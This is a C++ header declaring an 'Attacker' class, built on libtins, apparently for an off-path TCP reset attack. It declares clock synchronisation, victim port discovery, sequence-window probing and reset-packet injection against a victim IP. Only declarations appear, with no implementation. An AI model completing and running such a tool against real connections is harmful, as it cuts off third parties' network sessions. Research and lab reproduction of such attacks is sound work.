#pragma once

#include <tins/tins.h>
#include <chrono>
#include <vector>

#include "common.h"

class Attacker {
public:
    Attacker(
        ConnectionID legitConn, 
        uint32_t legitLastSeq, 
        const std::string& victimIP);

    std::chrono::milliseconds synchronizeClock();
    void setEstimatedWindowSz(uint32_t sz);
    uint32_t findPort(uint32_t from, uint32_t to);
    void resetConnection();
private:

    bool hasPort(uint32_t from, uint32_t to);
    uint32_t isInWindow(uint32_t from, uint32_t numBlocks);
    void sendResetPacktes(uint32_t fromSeq, uint32_t toSeq);
    uint32_t sendPackets(const std::vector<Tins::IP>& packets, int threshold = 90);

    ConnectionID legitConn_;
    uint32_t legitLastSeq_;
    std::string victimIP_;
    uint32_t victimPort_;
    Tins::PacketSender sender_;

    std::chrono::milliseconds syncDelayMs_;

    uint32_t estimatedWindowSz_ = 26703;
};